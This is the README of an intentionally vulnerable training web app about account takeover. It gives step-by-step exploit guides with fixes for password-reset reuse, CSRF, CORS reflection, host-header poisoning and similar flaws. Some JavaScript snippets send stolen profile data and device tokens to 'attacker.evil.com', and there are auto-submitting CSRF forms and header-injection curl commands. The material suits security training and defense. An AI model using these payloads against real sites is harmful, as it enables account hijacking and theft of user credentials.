# 🔐 Lab 4 — Account Takeover (ATO) Security Training Lab

> A deliberately vulnerable web application for practicing **Account Takeover** techniques found in real-world bug bounty programs and penetration testing engagements.

**Port:** `3002` | **Difficulty:** Intermediate → Advanced | **Vulnerabilities:** 13

---

## ⚠️ Legal Disclaimer

This lab is for **educational and research purposes only**.
All vulnerabilities are **intentional**. Never use these techniques against systems you do not own or have explicit written permission to test. The author is not responsible for any misuse.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Test Credentials](#test-credentials)
- [Vulnerability Index](#vulnerability-index)
- [Step-by-Step Exploit Guides](#step-by-step-exploit-guides)
  - [1. Password Reset Bypass](#1-password-reset-bypass)
  - [2. Security Question Overwrite](#2-security-question-overwrite)
  - [3. Email Change Takeover](#3-email-change-takeover)
  - [4. Email Verification Bypass](#4-email-verification-bypass)
  - [5. Unicode Normalization Attack](#5-unicode-normalization-attack)
  - [6. OAuth Pre-Account Takeover](#6-oauth-pre-account-takeover)
  - [7. CORS Misconfiguration](#7-cors-misconfiguration)
  - [8. CSRF — Email Change](#8-csrf--email-change)
  - [9. Host Header Injection](#9-host-header-injection)
  - [10. Response Manipulation](#10-response-manipulation)
  - [11. Old Session Reuse](#11-old-session-reuse)
  - [12. Trusted Device Cookie Leak](#12-trusted-device-cookie-leak)
  - [13. Pre-Account Takeover](#13-pre-account-takeover)
- [All Routes Reference](#all-routes-reference)
- [Recommended Tools](#recommended-tools)
- [Skills Practiced](#skills-practiced)

---

## Overview

Lab 4 simulates a realistic corporate authentication portal with **13 intentional Account Takeover vulnerabilities** based on real bug bounty reports and OWASP documentation. Each vulnerability has its own dedicated lab page with attack simulation, vulnerable code display, and step-by-step exploit instructions built into the UI.

### Lab Architecture

```
http://localhost:3002
│
├── /login                    → Standard login
├── /login/security           → Security question login (VULN)
├── /register                 → Account registration
├── /dashboard                → Protected dashboard
├── /admin                    → Admin panel (VULN: response manipulation)
├── /account/change-email     → Email change (VULN: CSRF + ATO)
├── /api/user/profile         → User profile API (VULN: CORS)
├── /api/batch                → Batch API (VULN: trusted device leak)
│
└── /lab/
    ├── reset-bypass          → Password reset token reuse
    ├── security-questions    → Security answer overwrite
    ├── email-change          → Email change takeover
    ├── email-verify-bypass   → Verification status bypass
    ├── unicode               → Unicode normalization collision
    ├── oauth                 → OAuth pre-ATO
    ├── cors                  → CORS misconfiguration
    ├── csrf                  → CSRF email change
    ├── host-header           → Host header injection
    ├── response-manip        → Response manipulation
    ├── old-sessions          → Old session reuse
    ├── trusted-device        → Trusted device cookie leak
    └── pre-ato               → Pre-account takeover
```

---

## Installation

### Prerequisites

- [Node.js](https://nodejs.org/) v14 or higher
- npm

### Steps

```bash
# 1. Clone or download the lab file
git clone https://github.com/strylee/ato-lab.git
cd ato-lab

# 2. Install dependencies
npm install express express-session body-parser

# 3. Run the lab
node lab4.js

# 4. Open in browser
# http://localhost:3002
```

You should see in terminal:
```
🔐 ATO Lab 4 running → http://localhost:3002

  Credentials:
  admin@corp.com  / admin123
  victim@corp.com / victim123
  user@corp.com   / user123
```

---

## Test Credentials

| Email | Password | Role | Verified | Trusted Device |
|---|---|---|---|---|
| `admin@corp.com` | `admin123` | Admin | ✅ Yes | `device-admin-001` |
| `victim@corp.com` | `victim123` | User | ✅ Yes | `device-victim-007` |
| `user@corp.com` | `user123` | User | ❌ No | `device-user-002` |

---

## Vulnerability Index

| # | Vulnerability | Severity | Endpoint |
|---|---|---|---|
| 1 | Password Reset Bypass | 🔴 High | `/lab/reset-bypass` |
| 2 | Security Question Overwrite | 🔴 High | `/lab/security-questions` |
| 3 | Email Change Takeover | 🔴 High | `/lab/email-change` |
| 4 | Email Verification Bypass | 🟡 Medium | `/lab/email-verify-bypass` |
| 5 | Unicode Normalization Attack | 🟡 Medium | `/lab/unicode` |
| 6 | OAuth Pre-Account Takeover | 🟡 Medium | `/lab/oauth` |
| 7 | CORS Misconfiguration | 🟡 Medium | `/lab/cors` |
| 8 | CSRF — Email Change | 🟡 Medium | `/lab/csrf` |
| 9 | Host Header Injection | 🟡 Medium | `/lab/host-header` |
| 10 | Response Manipulation | 🔵 Info | `/lab/response-manip` |
| 11 | Old Session Reuse | 🔵 Info | `/lab/old-sessions` |
| 12 | Trusted Device Cookie Leak | 🔴 High | `/lab/trusted-device` |
| 13 | Pre-Account Takeover | 🟡 Medium | `/lab/pre-ato` |

---

## Step-by-Step Exploit Guides

---

### 1. Password Reset Bypass

**Severity:** 🔴 High
**Type:** Token Reuse / Authentication Bypass
**Endpoint:** `GET /lab/reset-bypass/use/:token`

#### What's Vulnerable
Reset tokens are stored in memory with no expiry and are never deleted after use. Visiting the reset URL logs you directly into the account — no password required.

#### Steps to Exploit

```
1. Navigate to: http://localhost:3002/lab/reset-bypass

2. In "Step 1 — Request Reset", enter:
   Email: victim@corp.com
   → Click "GET RESET LINK"

3. Copy the token shown in the debug output, e.g.:
   /lab/reset-bypass/use/abc123xyz

4. Open the reset URL in your browser:
   http://localhost:3002/lab/reset-bypass/use/abc123xyz

5. You are now logged in as victim@corp.com — no password used.

6. Reuse the SAME token in a new browser tab → still works.
   The token is never invalidated after first use.
```

#### curl Example

```bash
# Step 1: Request reset token
curl -s -X POST http://localhost:3002/lab/reset-bypass/request \
  -d "email=victim@corp.com"

# Step 2: Use token (grab from response redirect)
curl -s -L http://localhost:3002/lab/reset-bypass/use/TOKEN \
  -c cookies.txt

# Step 3: Reuse same token again
curl -s -L http://localhost:3002/lab/reset-bypass/use/TOKEN \
  -c cookies2.txt
```

#### Fix
- Delete token from store immediately after first use
- Set a short expiry (e.g., 15 minutes)
- Bind token to user's IP or session fingerprint

---

### 2. Security Question Overwrite

**Severity:** 🔴 High
**Type:** Business Logic / Privilege Escalation
**Endpoint:** `POST /lab/security-questions/update`

#### What's Vulnerable
The update endpoint reads `username` from the POST body rather than from the authenticated session. Any logged-in user can overwrite any other account's security answers, then authenticate as that account.

#### Steps to Exploit

```
1. Login as a low-privilege user:
   Email:    user@corp.com
   Password: user123

2. Navigate to: http://localhost:3002/lab/security-questions

3. In the form, set:
   Target Username: admin
   New Answer 1:    hacked
   New Answer 2:    hacked
   New Answer 3:    hacked
   → Click "OVERWRITE ANSWERS"

4. Navigate to: http://localhost:3002/login/security

5. Enter:
   Username: admin
   Answer 1: hacked
   Answer 2: hacked
   Answer 3: hacked
   → Click "AUTHENTICATE"

6. You are now logged in as admin — full privilege escalation.
```

#### Raw HTTP Request

```http
POST /lab/security-questions/update HTTP/1.1
Host: localhost:3002
Cookie: connect.sid=<low-priv-session>
Content-Type: application/x-www-form-urlencoded

username=admin&a1=hacked&a2=hacked&a3=hacked
```

#### Fix
- Always derive the target account from `req.session`, never from the request body
- Require current password confirmation for security answer changes

---

### 3. Email Change Takeover

**Severity:** 🔴 High
**Type:** Account Takeover via Link Forwarding
**Endpoint:** `GET /account/confirm-email/:token`

#### What's Vulnerable
When an email change is requested, the confirmation link is sent to the **new** (unverified) email address. An attacker can:
- Request a change to the victim's email address
- The link is sent to the victim's inbox
- If the victim clicks it, the attacker's account now controls the victim's email
- Attacker then resets the password using the victim's email

Additionally, the token is reusable and never invalidated.

#### Steps to Exploit

```
1. Login as attacker:
   Email:    user@corp.com
   Password: user123

2. Navigate to: http://localhost:3002/lab/email-change

3. In "Request Email Change", enter:
   New Email: victim@corp.com
   → Click "REQUEST CHANGE"

4. Copy the confirmation link from the debug output:
   http://localhost:3002/account/confirm-email/TOKEN

5. Send this link to the victim (social engineering).
   When victim clicks it → attacker's account now has victim@corp.com

6. Attacker uses victim email to reset password → full ATO.
```

#### Fix
- Send the confirmation link to the **old** email address, not the new one
- Require current password to initiate email change
- Invalidate token after single use

---

### 4. Email Verification Bypass

**Severity:** 🟡 Medium
**Type:** Verification Status Inheritance
**Endpoint:** `POST /lab/email-verify-bypass/change`

#### What's Vulnerable
When an email change is performed, the account's `verified: true` status is inherited by the new email without requiring re-verification. This allows bypassing the email verification requirement for any target email.

#### Steps to Exploit

```
1. Login as attacker with a verified account:
   Email:    admin@corp.com
   Password: admin123

2. Navigate to: http://localhost:3002/lab/email-verify-bypass

3. Enter target email:
   victim@corp.com
   → Click "BYPASS VERIFICATION"

4. The account email is now victim@corp.com with verified=true.
   No verification email was sent to victim@corp.com.

5. The victim's email is now under attacker's control
   with verified status inherited from attacker's session.
```

#### Fix
- Always set `verified: false` when an email address changes
- Send a new verification email to the new address before activating it
- Do not transfer verification status between email addresses

---

### 5. Unicode Normalization Attack

**Severity:** 🟡 Medium
**Type:** Email Collision via Unicode
**Endpoint:** `POST /lab/unicode/register` → `POST /lab/unicode/login`

#### What's Vulnerable
The platform does not normalize Unicode characters during registration, but normalizes them during login lookup. This creates a collision where `vićtim@corp.com` (using Unicode ć, U+0107) resolves to the same account as `victim@corp.com` after normalization.

#### Steps to Exploit

```
1. Navigate to: http://localhost:3002/lab/unicode

2. Register a lookalike email:
   Email:    vićtim@corp.com   ← note the ć character
   Password: hack123
   → Click "REGISTER LOOKALIKE"

3. Now use "Normalized Login":
   Email:    vićtim@corp.com
   Password: hack123
   → Click "NORMALIZED LOGIN"

4. The server normalizes vićtim → victim during lookup
   and matches the real victim@corp.com account.
   You are now authenticated as victim@corp.com.
```

#### Unicode Characters to Try

```
ć → c  (U+0107)   vićtim@corp.com
ö → o  (U+00F6)   victiom@corp.com  
à → a  (U+00E0)   victàm@corp.com
ñ → n  (U+00F1)   victimñ@corp.com
```

#### Fix
- Normalize Unicode (NFKC/NFKD) on registration, not just on login
- Reject email addresses containing non-ASCII characters
- Store and compare normalized email addresses consistently

---

### 6. OAuth Pre-Account Takeover

**Severity:** 🟡 Medium
**Type:** Pre-Registration Attack
**Endpoint:** `POST /lab/oauth/login`

#### What's Vulnerable
When a user registers via OAuth, the platform merges the OAuth identity with any existing account sharing the same email — without verifying who originally created that account. An attacker who pre-registers with the victim's email retains password access even after the victim "confirms" their account via OAuth.

#### Steps to Exploit

```
1. Navigate to: http://localhost:3002/lab/pre-ato

2. Pre-register the victim's email with attacker-controlled password:
   Email:    newvictim@corp.com
   Password: attacker123
   → Click "PRE-REGISTER VICTIM EMAIL"

3. Wait (simulate victim signing up via OAuth):
   Email: newvictim@corp.com
   → Click "VICTIM OAUTH LOGIN (confirm account)"
   This simulates the victim signing in via Google OAuth.

4. Platform merges OAuth identity with the pre-existing account.

5. Attacker now logs in using the password they set in step 2:
   Email:    newvictim@corp.com
   Password: attacker123
   → Click "ATTACKER LOGIN → VICTIM ACCOUNT"

6. Full access to victim's account.
```

#### Fix
- Require email verification before allowing password-based login
- Do not merge OAuth accounts with unverified pre-existing registrations
- Mark accounts created via OAuth vs manual registration and treat differently

---

### 7. CORS Misconfiguration

**Severity:** 🟡 Medium
**Type:** Cross-Origin Data Theft
**Endpoint:** `GET /api/user/profile`

#### What's Vulnerable
The API endpoint reflects any `Origin` header in `Access-Control-Allow-Origin` and sets `Access-Control-Allow-Credentials: true`. This lets attacker-controlled pages read authenticated responses cross-origin, leaking session info and trusted device tokens.

#### Steps to Exploit

```
1. Victim must be logged in at http://localhost:3002

2. Attacker hosts this page at https://attacker.evil.com:

   <script>
     fetch("http://localhost:3002/api/user/profile", {
       credentials: "include"
     })
     .then(r => r.json())
     .then(data => {
       // Exfiltrate to attacker server
       fetch("https://attacker.evil.com/steal?d=" + JSON.stringify(data))
       console.log(data) // {email, role, trustedDevice, ...}
     })
   </script>

3. When victim visits the attacker page:
   - Browser sends victim's session cookie to localhost:3002
   - Server reflects Origin header → cross-origin read allowed
   - Attacker receives: email, role, trustedDevice token
```

#### curl Test

```bash
# Test CORS reflection
curl -H "Origin: https://attacker.evil.com" \
     -H "Cookie: connect.sid=VICTIM_SESSION" \
     http://localhost:3002/api/user/profile -v

# Look for:
# Access-Control-Allow-Origin: https://attacker.evil.com
# Access-Control-Allow-Credentials: true
```

#### Fix
- Maintain an explicit allowlist of trusted origins
- Never reflect arbitrary Origins
- Set `Access-Control-Allow-Credentials: true` only for trusted origins

---

### 8. CSRF — Email Change

**Severity:** 🟡 Medium
**Type:** Cross-Site Request Forgery
**Endpoint:** `POST /account/change-email`

#### What's Vulnerable
The email change endpoint has no CSRF token validation. A malicious page can silently submit a form that changes the victim's email address while they are authenticated.

#### Steps to Exploit

```
1. Victim must be logged in at http://localhost:3002

2. Attacker hosts this HTML page anywhere:

   <html>
   <body onload="document.forms[0].submit()">
   <form action="http://localhost:3002/account/change-email" method="POST">
     <input name="newEmail" value="attacker@evil.com">
   </form>
   </body>
   </html>

3. Victim visits attacker's page.
   Form auto-submits → victim's email changed to attacker@evil.com.

4. Attacker requests password reset for attacker@evil.com
   → receives reset link → full account access.
```

#### Navigate in Lab

```
Go to: http://localhost:3002/lab/csrf
Click: "FIRE CSRF" to simulate the attack locally
```

#### Fix
- Implement CSRF tokens (synchronizer token pattern)
- Use `SameSite=Strict` or `SameSite=Lax` on session cookies
- Validate `Origin` and `Referer` headers on state-changing requests

---

### 9. Host Header Injection

**Severity:** 🟡 Medium
**Type:** Password Reset Link Poisoning
**Endpoint:** `POST /lab/host-header/reset`

#### What's Vulnerable
The server builds password reset links using the `X-Forwarded-Host` or `Host` header from the request without validation. An attacker can inject their own domain, causing the reset link to point to an attacker-controlled server.

#### Steps to Exploit

```
1. Navigate to: http://localhost:3002/lab/host-header

2. Fill the form:
   Target Email:          victim@corp.com
   X-Forwarded-Host:      attacker.evil.com
   → Click "POISON RESET LINK"

3. The server generates a reset link like:
   https://attacker.evil.com/reset/TOKEN

4. This link is emailed to victim@corp.com.
   When victim clicks it, the token is sent to attacker's server.

5. Attacker uses stolen token on the real site:
   http://localhost:3002/lab/reset-bypass/use/TOKEN
```

#### curl Example

```bash
curl -X POST http://localhost:3002/lab/host-header/reset \
  -H "X-Forwarded-Host: attacker.evil.com" \
  -d "email=victim@corp.com"

# Or inject all three headers simultaneously:
curl -X POST http://localhost:3002/lab/host-header/reset \
  -H "Host: attacker.evil.com" \
  -H "X-Forwarded-Host: attacker.evil.com" \
  -H "Referer: https://attacker.evil.com" \
  -d "email=victim@corp.com"
```

#### Fix
- Never use user-supplied headers to build URLs
- Hardcode the application's base URL in configuration
- Maintain an allowlist of trusted proxy headers and IPs

---

### 10. Response Manipulation

**Severity:** 🔵 Info
**Type:** Client-Side Trust / Boolean Flip
**Endpoint:** `GET /admin`

#### What's Vulnerable
The admin check returns `{"authorized": false}` for non-admin users. If this response is intercepted and modified to `{"authorized": true}` by a proxy, or the HTTP status code is changed from 403 to 200, access may be granted depending on how the client-side logic processes it.

#### Steps to Exploit with Burp Suite

```
1. Open Burp Suite → enable Proxy intercept

2. Login as victim@corp.com / victim123

3. Navigate to: http://localhost:3002/admin

4. In Burp, intercept the response and modify:

   BEFORE:
   HTTP/1.1 200 OK
   {"authorized": false, "user": "victim"}

   AFTER:
   HTTP/1.1 200 OK
   {"authorized": true, "user": "victim"}

5. Forward the modified response.
   If client-side logic trusts this value → admin access granted.
```

#### Also Try

```
# Status code manipulation
403 Forbidden → 200 OK

# Body manipulation  
{"success": false} → {"success": true}
{"error": "denied"} → {}
{"role": "user"}    → {"role": "admin"}
```

#### Fix
- Enforce access control server-side on every request, never trust client responses
- The server should never rely on a client returning authorization results
- Use session-based role checking that cannot be intercepted

---

### 11. Old Session Reuse

**Severity:** 🔵 Info
**Type:** Session Management Flaw
**Endpoint:** Any authenticated route

#### What's Vulnerable
When a user logs out, only the client-side cookie is cleared. The server-side session store is never invalidated. Any previously captured session cookie remains valid indefinitely.

#### Steps to Exploit

```
1. Login as victim@corp.com / victim123

2. Open Browser DevTools → Application → Cookies
   Copy the value of: connect.sid

3. Victim clicks logout → their cookie is cleared

4. Attacker uses the previously captured cookie:

   curl -H "Cookie: connect.sid=SAVED_VALUE" \
        http://localhost:3002/dashboard

5. Access granted — session is still active server-side.
```

#### View Stored Old Sessions

```
Navigate to: http://localhost:3002/lab/old-sessions
Shows all previously issued session IDs that are still valid
```

#### Fix
- Call `session.destroy()` on the server side during logout
- Use a server-side session store (Redis, database) that can actively invalidate sessions
- Implement session rotation on privilege changes

---

### 12. Trusted Device Cookie Leak

**Severity:** 🔴 High
**Type:** Batch API Response Chaining / Cross-Origin Data Exfiltration
**Endpoint:** `POST /api/batch`

#### What's Vulnerable
The batch API returns sensitive fields including `trustedDevice` tokens in its response. Combined with the CORS misconfiguration, an attacker can chain requests to exfiltrate the trusted device token cross-origin. Once obtained, the token can be replayed to authenticate as the victim without a password or 2FA.

#### Steps to Exploit

```
1. Login as victim@corp.com / victim123

2. Navigate to: http://localhost:3002/lab/trusted-device

3. Click "FIRE BATCH REQUEST"
   → Response contains trustedDevice: "device-victim-007"

4. Use the stolen token in "USE TRUSTED DEVICE TOKEN":
   Token: device-victim-007
   → Logged in as victim without password

Advanced — Cross-origin exfiltration:

   fetch("http://localhost:3002/api/batch", {
     method: "POST",
     credentials: "include",
     headers: {"Content-Type": "application/json"},
     body: JSON.stringify([{id:"leak", url:"/api/user/profile"}])
   })
   .then(r => r.json())
   .then(data => {
     const token = data[0].body.trustedDevice
     fetch("https://attacker.evil.com/steal?token=" + token)
   })
```

#### Fix
- Never include sensitive tokens in batch API responses
- Scope CORS policy to trusted origins only
- Treat trusted device tokens with the same sensitivity as passwords
- Bind device tokens to browser fingerprint + IP

---

### 13. Pre-Account Takeover

**Severity:** 🟡 Medium
**Type:** Race Condition / Registration Logic Flaw
**Endpoint:** `POST /register` + `POST /lab/oauth/login`

#### What's Vulnerable
An attacker registers with the victim's email address before the victim does. When the victim later signs up (via OAuth or direct registration), the platform activates the existing account. The attacker's pre-set password remains valid.

#### Steps to Exploit

```
1. Navigate to: http://localhost:3002/lab/pre-ato

2. Pre-register the target email:
   Email:    newvictim@corp.com
   Password: attacker123
   → Click "PRE-REGISTER VICTIM EMAIL"

3. Wait for victim to sign up via OAuth
   (simulate by clicking "VICTIM OAUTH LOGIN")

4. OAuth merges with the pre-existing account.

5. Attacker logs in:
   Email:    newvictim@corp.com
   Password: attacker123
   → DASHBOARD ACCESS as victim
```

#### Variant — Via Third-Party OAuth Provider

```
1. Create account on Google/Facebook with vićtim@company.com
   (Unicode lookalike — provider may not verify)
2. The OAuth provider normalizes to victim@company.com
3. Login to target platform via this OAuth
4. Platform resolves to victim's account → ATO
```

#### Fix
- Require email verification before merging OAuth with existing accounts
- Flag unverified accounts and prevent password-based login until verified
- Alert the victim's email when a new sign-in method is linked

---

## All Routes Reference

| Method | Route | Description | Vulnerability |
|---|---|---|---|
| `GET` | `/` | Home / Lab Index | — |
| `GET` | `/login` | Login page | — |
| `POST` | `/login` | Authenticate | Old session not invalidated |
| `GET` | `/login/security` | Security Q login | Username from body |
| `POST` | `/login/security` | Security Q auth | Target account injectable |
| `GET` | `/register` | Register page | — |
| `POST` | `/register` | Create account | No unicode normalization |
| `GET` | `/dashboard` | User dashboard | — |
| `GET` | `/admin` | Admin panel | Response manipulation |
| `GET` | `/logout` | Logout | Server session not destroyed |
| `GET` | `/account/change-email` | Change email form | — |
| `POST` | `/account/change-email` | Submit change | No CSRF token |
| `GET` | `/account/confirm-email/:token` | Confirm change | Token reusable |
| `GET` | `/api/user/profile` | Profile API | CORS origin reflection |
| `POST` | `/api/batch` | Batch API | Leaks trustedDevice |
| `GET` | `/lab/reset-bypass` | Reset bypass lab | — |
| `POST` | `/lab/reset-bypass/request` | Generate token | Token never expires |
| `GET` | `/lab/reset-bypass/use/:token` | Use token | No invalidation |
| `GET` | `/lab/security-questions` | Sec Q lab | — |
| `POST` | `/lab/security-questions/update` | Overwrite answers | Username injectable |
| `GET` | `/lab/email-change` | Email ATO lab | — |
| `POST` | `/lab/email-change/request` | Request change | Link to new email |
| `GET` | `/lab/email-verify-bypass` | Verify bypass | — |
| `POST` | `/lab/email-verify-bypass/change` | Change w/ bypass | Inherits verified=true |
| `GET` | `/lab/unicode` | Unicode lab | — |
| `POST` | `/lab/unicode/register` | Register lookalike | No normalization |
| `POST` | `/lab/unicode/login` | Normalized login | Collision |
| `GET` | `/lab/oauth` | OAuth lab | — |
| `POST` | `/lab/oauth/login` | OAuth login | Merges any email |
| `GET` | `/lab/cors` | CORS lab | — |
| `GET` | `/lab/csrf` | CSRF lab | — |
| `GET` | `/lab/host-header` | Host header lab | — |
| `POST` | `/lab/host-header/reset` | Poison reset link | X-Forwarded-Host trusted |
| `GET` | `/lab/response-manip` | Response manip | — |
| `GET` | `/lab/old-sessions` | Old sessions | — |
| `GET` | `/lab/trusted-device` | Device token lab | — |
| `POST` | `/api/batch` | Batch API | Device token leak |
| `POST` | `/lab/trusted-device/use` | Use device token | Auth without password |
| `GET` | `/lab/pre-ato` | Pre-ATO lab | — |
| `POST` | `/lab/pre-ato/register` | Pre-register | — |
| `POST` | `/lab/pre-ato/login` | Attacker login | — |

---

## Recommended Tools

| Tool | Purpose |
|---|---|
| [Burp Suite Community](https://portswigger.net/burp) | Intercept, modify, replay HTTP requests |
| [OWASP ZAP](https://www.zaproxy.org/) | Automated scanning, fuzzing |
| Browser DevTools | Cookie inspection, network tab |
| `curl` | Command-line HTTP request crafting |
| [Postman](https://www.postman.com/) | API request testing |

### Useful curl Snippets

```bash
# Save cookies to file
curl -c cookies.txt -d "email=victim@corp.com&password=victim123" \
  http://localhost:3002/login

# Replay saved session
curl -b cookies.txt http://localhost:3002/dashboard

# Inject X-Forwarded-For
curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:3002/api/user/profile

# Inject custom Origin (CORS test)
curl -H "Origin: https://evil.com" -b cookies.txt \
  http://localhost:3002/api/user/profile -v

# CSRF simulation
curl -b cookies.txt -X POST \
  -d "newEmail=attacker@evil.com" \
  http://localhost:3002/account/change-email
```

---

## Skills Practiced

After completing all 13 labs you will have hands-on experience with:

- **Authentication bypass** via token reuse and direct access
- **Business logic flaws** in security question and email change flows
- **OAuth security** — pre-registration and account merging attacks
- **Session management** — old sessions, trusted device abuse
- **Header injection** — Host, X-Forwarded-Host, X-Forwarded-For
- **CORS exploitation** — origin reflection and credential leakage
- **CSRF attacks** — forging state-changing requests
- **Unicode attacks** — email normalization collisions
- **Response manipulation** — boolean flipping, status code tampering
- **Batch API abuse** — chaining responses to exfiltrate sensitive data

---

## Full Lab Series

| Lab | Topic | Port |
|---|---|---|
| Lab 1 | Basic 2FA Bypass | `3000` |
| Lab 2 | Advanced 2FA Bypass | `3001` |
| Lab 4 | Account Takeover (ATO) | `3002` |

---

## References

- [HackTricks — Account Takeover](https://book.hacktricks.xyz/pentesting-web/account-takeover)
- [OWASP — Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [PortSwigger — Authentication Labs](https://portswigger.net/web-security/authentication)
- [Unicode Security Considerations](https://unicode.org/reports/tr36/)

---

<p align="center">
  Built for security researchers and bug bounty hunters 🛡️<br>
  Practice responsibly — never test on systems you don't own
</p>
